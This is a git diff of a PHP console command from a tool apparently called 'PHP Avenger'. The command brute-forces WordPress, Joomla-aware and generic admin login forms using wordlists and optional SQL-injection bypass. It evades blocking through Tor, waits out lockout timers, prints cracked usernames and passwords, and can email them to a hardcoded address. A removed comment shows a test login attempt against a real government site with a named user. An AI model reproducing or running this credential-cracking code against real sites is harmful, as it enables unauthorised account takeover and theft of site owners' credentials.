@@ -13,6 +13,7 @@ use Symfony\Component\Console\Helper\ProgressBar;
 use Respect\Validation\Validator as v;
 use Aszone\WordPress\WordPress;
 use Aszone\Site\Site;
+use Aszone\Joomla\Joomla;
 use Aszone\ProxySiteList\ProxySiteList;
 use Service\Mailer;
 
@@ -124,126 +125,135 @@ class BruteForceController extends Command{
         $ProxySiteList= $input->getOption('proxySiteList');
         $injection      = $input->getOption('injection');
 
-        /*$wp = new WordPress("http://www.museus.gov.br/wp-content/uploads/2014/09/guia_virtual_8primavera.pdf");
-        $returnHtml=$wp->sendDataToLoginWordPress("joao lemgruber","123","http://www.museus.gov.br/");
-        var_dump($returnHtml);
-        exit();*/
-
         if($injection)
         {
             $output->writeln("<error>Injection is not effective in brute force in WordPress...</error>");
+            exit();
         }
 
         //verify if target is list or one
         $targets=$this->getTargetsInArray($target);
 
-
+        if($targets==false )
+        {
+            $output->writeln("<error>selected targets...</error>");
+            exit();
+        }
 
         $resultFinal = array();
 
         $oldTargets=[];
-        if($targets!=false ){
-            //CONFIG PROFRESSBAR
-            $progress = new ProgressBar($output, 351*count($targets) );
-            $progress=$this->configBar($progress);
 
-            foreach ($targets as $keyTarget => $valueTarget) {
+        //CONFIG PROFRESSBAR
+        $progress = new ProgressBar($output, 351*count($targets) );
+        $progress=$this->configBar($progress);
 
-                $output->writeln(""); 
-                $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
+        foreach ($targets as $keyTarget => $valueTarget) {
 
-                $wp = new WordPress($valueTarget);
-                if($tor)
-                {
-                    $wp->setTor();
-                }
+            $output->writeln("");
+            $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
 
-                //VERIFY IF EXIST USER ESPECIFY, IF CASE NOT, LIST USER OF WORDPRESS
-                $output->writeln("<info>Searching for users, wait...</info>");
+            $wp = new WordPress($valueTarget);
+            if($tor)
+            {
+                $wp->setTor();
+            }
 
-                $usernames=$this->getUsernamesInArrayWP($username,$wp);
+            //VERIFY IF EXIST USER ESPECIFY, IF CASE NOT, LIST USER OF WORDPRESS
+            $output->writeln("<info>Searching for users, wait...</info>");
 
-                $output->writeln("<info></info>");
-                $output->writeln("<info>".count($usernames)." of users...</info>");
+            $usernames=$this->getUsernamesInArrayWP($username,$wp);
 
-                //VERIFY IS WORDPRESS
-                $isWordPress=$wp->isWordPress();
+            $output->writeln("<info></info>");
+            $output->writeln("<info>".count($usernames)." of users...</info>");
 
+            //VERIFY IS WORDPRESS
+            $isWordPress=$wp->isWordPress();
 
-                //RETURN BASENAME OF TARGET WP
-                $baseUrlWordPress=$wp->getBaseUrlWordPressByUrl();
+            //RETURN BASENAME OF TARGET WP
+            $baseUrlWordPress=$wp->getBaseUrlWordPressByUrl();
 
-                //verify is wordlist and set wordlist default
-                $wordlist=$wp->getWordListInArray($wordlist);
+            if(array_search($baseUrlWordPress,$oldTargets)!=false)
+            {
+                $output->writeln("<error></error>");
+                $output->writeln("<error>Target repetead...</error>");
+                continue;
+            }
 
-                //VALIDATEE IF IS WORDPRESS AND EXIST USERNAMES
-                if($isWordPress && $usernames!=false && array_search($baseUrlWordPress,$oldTargets)==false){
-                    foreach($usernames as $username){
-                        $output->writeln("<info>Search password of ".$username."</info>");
-                        foreach ($wordlist as $keyWordList => $valueWordList) {
-                            echo $valueWordList."\n";
-                            $progress->advance();
+            //verify is wordlist and set wordlist default
+            $wordlist=$wp->getWordListInArray($wordlist);
 
-                            $returnHtml=$wp->sendDataToLoginWordPress($username,$valueWordList,$baseUrlWordPress);
-                            //verify if is block and change ip of tor
-                            if(($returnHtml['status']=='403')OR($returnHtml['status']=='500')OR($returnHtml['status']=='401')){
-                                //change ip of tor
-                                echo "error ".$returnHtml['status'];
-                                //break;
-                            }
+            //VALIDATEE IF IS WORDPRESS AND EXIST USERNAMES
+            if($isWordPress AND $usernames!=false){
 
-                            $validateLogon=$wp->validateLogon($returnHtml['body']);
+                foreach($usernames as $username){
 
-                            // check if exist block for time
-                            $checkBloked=$wp->checkBlockedTime($returnHtml['body']);
-                            if($checkBloked)
-                            {
-                                $output->writeln("<error>Site bloked for ".$checkBloked." seconds</error>");
-                                sleep($checkBloked);
-                            }
+                    $output->writeln("<info>Search password of ".$username."</info>");
+                    foreach ($wordlist as $keyWordList => $valueWordList) {
+                        echo $valueWordList."\n";
+                        $progress->advance();
 
-                            if($validateLogon){
+                        $returnHtml=$wp->sendDataToLoginWordPress($username,$valueWordList,$baseUrlWordPress);
+                        //verify if is block and change ip of tor
+                        if(($returnHtml['status']=='403')OR($returnHtml['status']=='500')OR($returnHtml['status']=='401')){
 
-                                $resultFinal[$keyTarget]['target']=$valueTarget;
-                                $resultFinal[$keyTarget]['username']=$username;
-                                $resultFinal[$keyTarget]['password']=$valueWordList;
-
-                                $output->writeln("");
-                                $output->writeln("<info>Login success</info>");
-                                $output->writeln("<info>Target: ".$valueTarget."</info>");
-                                $output->writeln("<info>Username: ".$username."</info>");
-                                $output->writeln("<info>Password: ".$valueWordList."</info>");
-
-                                $msg = "PHP Avenger Informer, SUCCESS:<br><br>";
-                                $msg.= "Target =".$valueTarget."<br>";
-                                $msg.= "Username =".$username."<br>";
-                                $msg.= "Password =".$valueWordList."<br>";
-                                if($optionMail){
-                                    $mailer = new Mailer();
-                                    $mailer->sendMessage('lenonleite@gmail.com',$msg);
-                                }
-
-                                break;
-                            }
-
+                            //change ip of tor
+                            echo "error ".$returnHtml['status'];
+                            //break;
                         }
+
+                        $validateLogon=$wp->validateLogon($returnHtml);
+
+                        // check if exist block for time
+                        $checkBloked=$wp->checkBlockedTime($returnHtml['body']);
+                        if($checkBloked)
+                        {
+                            $output->writeln("<error>Site bloked for ".$checkBloked." seconds</error>");
+                            sleep($checkBloked);
+                        }
+
+                        if($validateLogon)
+                        {
+                            $resultFinal[$keyTarget]['target']=$valueTarget;
+                            $resultFinal[$keyTarget]['username']=$username;
+                            $resultFinal[$keyTarget]['password']=$valueWordList;
+
+                            $output->writeln("");
+                            $output->writeln("<info>Login success</info>");
+                            $output->writeln("<info>Target: ".$valueTarget."</info>");
+                            $output->writeln("<info>Username: ".$username."</info>");
+                            $output->writeln("<info>Password: ".$valueWordList."</info>");
+
+                            $msg = "PHP Avenger Informer, SUCCESS:<br><br>";
+                            $msg.= "Target =".$valueTarget."<br>";
+                            $msg.= "Username =".$username."<br>";
+                            $msg.= "Password =".$valueWordList."<br>";
+                            if($optionMail){
+                                $mailer = new Mailer();
+                                $mailer->sendMessage('lenonleite@gmail.com',$msg);
+                            }
+
+                            break;
+                        }
+
                     }
-                    $username=false;
-                }else{
-                    $output->writeln("<error>Users not found or This site is not WordPress...</error>");
                 }
-                $oldTargets[]=$baseUrlWordPress;
+                $username=false;
+            }else{
+                $output->writeln("<error>Users not found or This site is not WordPress...</error>");
             }
-            $progress->finish();
-
-            //SEND MAIL WITH RESULT FINAL
-            if($optionMail){
-                $this->sendMailWordPress($resultFinal);
-            }
-
-            //PRINT RESULT LIST FINAL
-            $this->printResult($resultFinal,$output);
+            $oldTargets[]=$baseUrlWordPress;
         }
+        $progress->finish();
+
+        //SEND MAIL WITH RESULT FINAL
+        if($optionMail){
+            $this->sendMailWordPress($resultFinal);
+        }
+
+        //PRINT RESULT LIST FINAL
+        $this->printResult($resultFinal,$output);
+
 
 
 
@@ -286,9 +296,11 @@ class BruteForceController extends Command{
 
         $wordlist=$this->getWordListExpecify($injection,$wordlist);
 
-        $oldTargets=[];
+        $oldTargets[]="";
+
         if($targets!=false )
         {
+
             //CONFIG PROFRESSBAR
             $progress = new ProgressBar($output, count($wordlist) * count($targets));
             $progress = $this->configBar($progress);
@@ -297,81 +309,112 @@ class BruteForceController extends Command{
             {
 
                 $site = new Site($valueTarget,$proxy);
+
+                $output->writeln("");
+                $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
+
+                //var_dump($site->bodyTarget);
+                //If not find target, go!!
+                if(!$site->bodyTarget){
+                    $output->writeln("");
+                    $output->writeln("<error>Target no found</error>");
+                    continue;
+                }
+
+
                 //verify is wordlist and set wordlist default
                 //RETURN BASENAME OF TARGET
                 $baseUrl=$site->getBaseUrByUrl();
+                //Check if injection with joomla or wordpress.
                 //Check if target enter in loop in the past
 
-                if(!@array_search($oldTargets,$baseUrl))
+                if(array_search($baseUrl,$oldTargets)!=false)
                 {
-
-                    $oldTargets[]=$baseUrl;
-
-
                     $output->writeln("");
-                    $output->writeln("<info>Target ".$keyTarget." - ".$valueTarget."</info>");
+                    $output->writeln("<error>Target repeated...</error>");
+                    continue;
+                }
 
+                $oldTargets[]=$valueTarget;
 
-                    $resultActionsForm=$site->getActionForms();
+                $joomla = new Joomla($valueTarget,$proxy);
+                $wordpress = new WordPress($valueTarget,$proxy);
+                $wordpress->setTor();
 
-                    foreach($resultActionsForm as $actionForm) {
+                if(($joomla->isJoomla() OR $wordpress->isWordPress()) AND $injection)
+                {
+                    $output->writeln("");
+                    $output->writeln("<error>This target is famous cms, and it is not vunerability at injection on login...</error>");
+                    continue;
+                }
+                $resultActionsForm=$site->getActionForms();
+                ;
+                if(!$resultActionsForm)
+                {
+                    $output->writeln("");
+                    $output->writeln("<error>Not find form in page...</error>");
+                    continue;
+                }
 
-                        //$resultIsAdmin = $site->isAdmin();
+                foreach($resultActionsForm as $actionForm) {
+                    //$resultIsAdmin = $site->isAdmin();
 
-                        $resultIsAdmin=$site->formIsAdmin($actionForm);
-                        //$resultIsAdmin=true;
-                        if ($resultIsAdmin) {
+                    $resultIsAdmin=$site->formIsAdmin($actionForm);
+                    //$resultIsAdmin=true;
+                    if ($resultIsAdmin) {
 
-                            $usernameField = $site->getNameFieldUsername($actionForm);
+                        $usernameField = $site->getNameFieldUsername($actionForm);
 
-                            $passwordField = $site->getNameFieldPassword($actionForm);
+                        $passwordField = $site->getNameFieldPassword($actionForm);
 
-                            $methodForm = $site->getMethodForm($actionForm);
+                        $methodForm = $site->getMethodForm($actionForm);
 
-                            $otherFields = $site->getOthersField($actionForm,array_merge($usernameField, $passwordField));
+                        $otherFields = $site->getOthersField($actionForm,array_merge($usernameField, $passwordField));
 
-                            if(!$usernames AND $injection){
-                                $resultOfBruteForce = $site->bruteForceAllInjection($actionForm, $methodForm, $usernameField, $passwordField, $otherFields,$wordlist);
-                            }
-                            else
-                            {
-                                $resultOfBruteForce = $site->bruteForceAll($actionForm, $methodForm, $usernameField, $passwordField, $otherFields,$wordlist,$usernames);
-                            }
-
-                            if ($resultOfBruteForce) {
-
-                                $output->writeln("");
-                                $output->writeln("<info>Login success</info>");
-                                $output->writeln("<info>Target: " . $valueTarget . "</info>");
-                                $output->writeln("<info>Action : " . $actionForm . "</info>");
-                                $output->writeln("<info>Username-> Field : " . key($usernameField) . " - Value: " . $resultOfBruteForce['username'] . "</info>");
-                                $output->writeln("<info>Password-> Field : " . key($passwordField) . " - Value: " . $resultOfBruteForce['password'] . "</info>");
-
-                                $resultFinal[0]['target'] = $valueTarget;
-                                $resultFinal[0]['usernameField'] = key($usernameField);
-                                $resultFinal[0]['username'] = $resultOfBruteForce['username'];
-                                $resultFinal[0]['passwordField'] = key($passwordField);
-                                $resultFinal[0]['password'] = $resultOfBruteForce['password'];
-                                $resultFinal[0]['action'] = $actionForm;
-
-                                if (isset($resultOfBruteForce['obs'])) {
-                                    $resultFinal[0]['obs'] = $resultOfBruteForce['obs'];
-                                }
-                                if ($email) {
-                                    $this->sendMailWordPress($resultFinal);
-                                }
-                                //PRINT RESULT LIST FINAL
-                                $this->printResult($resultFinal, $output);
-
-                            }
-                            //
-                            //$methodForm     = $site->getMethodForm();
-                        } else {
-                            echo "is not admin";
+                        if(!$usernames AND $injection){
+                            $resultOfBruteForce = $site->bruteForceAllInjection($actionForm, $methodForm, $usernameField, $passwordField, $otherFields,$wordlist);
+                        }
+                        else
+                        {
+                            $resultOfBruteForce = $site->bruteForceAll($actionForm, $methodForm, $usernameField, $passwordField, $otherFields,$wordlist,$usernames);
                         }
 
+                        if ($resultOfBruteForce) {
+
+                            $output->writeln("");
+                            $output->writeln("<info>Login success</info>");
+                            $output->writeln("<info>Target: " . $valueTarget . "</info>");
+                            $output->writeln("<info>Action : " . $actionForm . "</info>");
+                            $output->writeln("<info>Username-> Field : " . key($usernameField) . " - Value: " . $resultOfBruteForce['username'] . "</info>");
+                            $output->writeln("<info>Password-> Field : " . key($passwordField) . " - Value: " . $resultOfBruteForce['password'] . "</info>");
+
+                            $resultFinal[0]['target'] = $valueTarget;
+                            $resultFinal[0]['usernameField'] = key($usernameField);
+                            $resultFinal[0]['username'] = $resultOfBruteForce['username'];
+                            $resultFinal[0]['passwordField'] = key($passwordField);
+                            $resultFinal[0]['password'] = $resultOfBruteForce['password'];
+                            $resultFinal[0]['action'] = $actionForm;
+
+                            if (isset($resultOfBruteForce['obs'])) {
+                                $resultFinal[0]['obs'] = $resultOfBruteForce['obs'];
+                            }
+                            if ($email) {
+                                $this->sendMailWordPress($resultFinal);
+                            }
+                            //PRINT RESULT LIST FINAL
+                            $this->printResult($resultFinal, $output);
+
+                        }
+                        //
+                        //$methodForm     = $site->getMethodForm();
+                    } else {
+                        $output->writeln("");
+                        $output->writeln("<error>Form with action ".$actionForm." is not admin...</error>");
                     }
+
+
                 }
+
 
 
             }
